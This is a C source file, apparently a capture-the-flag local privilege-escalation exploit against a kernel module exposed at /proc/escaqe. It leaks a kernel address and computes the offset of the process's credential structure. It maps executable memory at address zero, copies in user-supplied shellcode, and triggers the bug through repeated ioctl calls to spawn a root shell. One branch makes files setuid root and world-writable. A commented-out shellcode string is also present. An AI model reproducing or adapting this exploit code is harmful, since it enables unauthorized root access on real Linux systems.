// compile: musl-gcc -static exploit.c -o exploit
// note: this exploit code work properly after 18 hours of hard trying
#include <stdio.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <signal.h>

char payload[42];
int fd1;
int fd2;

int pid;
void leak_and_fork(){
    char payload[42];

    prctl(PR_SET_NAME, "AAAAAAAA", 0,0,0);
    fd1 = open("/proc/escaqe", O_RDWR);
    long leak;
    read(fd1, &leak, 8);
    printf("[+] Raw Addr 0x%llx\n", leak);
    printf("[+] Struct cred here 0x%llx\n", leak+0x630L);
    printf("[+] PID name here 0x%llx\n", leak+0x648L);
    pid = fork();
    printf("PID %d\n",pid);
    if(pid < 0){
        puts("[*] fork error!");
        exit(0);
    }
    else if (pid == 0){
        puts("[*] forking as child. prepare ur shellcode");
        system("sh");
    }
    //system("sh");
    else{

	//puts("le flag");
	//system("chmod 777 /flag");
	while(1){
		if (getuid() == 0){
			puts("WIN");
			//force_open();
			//close(fd2);
			//kill(pid, SIGKILL);
			system("chown -R root:root /home/ctf/*; chmod 4777 /home/ctf/*");
			//system("sh");
			//close(fd1);
			//close(fd2);
			//exit(0);
		}
	}
    }

}

void shell(){
    system("sh");
}

void load_and_pwn(){
    int fd;
    int get_value;
    //char payload[] = "\x48\x31\xc0\x48\x31\xdb\x48\xb8\x2f\x74\x6d\x70\x2f\x65\x78\x70\x48\xc7\xc3\xa0\x57\x44\x82\x48\x89\x03\xc3";
    char payload[34];
    printf("shellcode: ");
    scanf("%s", payload);

    char *addr = mmap(0, 4096,PROT_READ|PROT_WRITE|PROT_EXEC, MAP_FIXED|MAP_PRIVATE|MAP_ANONYMOUS,-1, 0);
    fd2 = open("/proc/escaqe", O_RDWR);
    //fd2 = 1;
    if (fd2 < 0){
        printf("[!] Cant open device\n");
    }

    else{
	//close(fd2);
	//kill(pid, SIGKILL);
        printf("[+] Device opened\n");
        memcpy(0, &payload, sizeof(payload));
        //ioctl(fd2, 0x1001);
	ioctl(fd2, 0x1001);
	ioctl(fd2, 0x1001);
        // close(fd2);
        //system("chmod 777 /flag; cat /flag");
	system("sh");
    }

}

int main(int argc, char *argv[]){
    char *argone = argv[1]; // choose
    int result;
    if(strcmp(argone, "fork") == 0){
        leak_and_fork();
    }

    else if(strcmp(argone, "load") == 0){
    load_and_pwn();
    
    }

    else if(strcmp(argone, "shell") == 0){
    	shell();
    
    }

    else{
    printf("./exploit leak\n./exploit exp shellcode_here\n");
    }

}

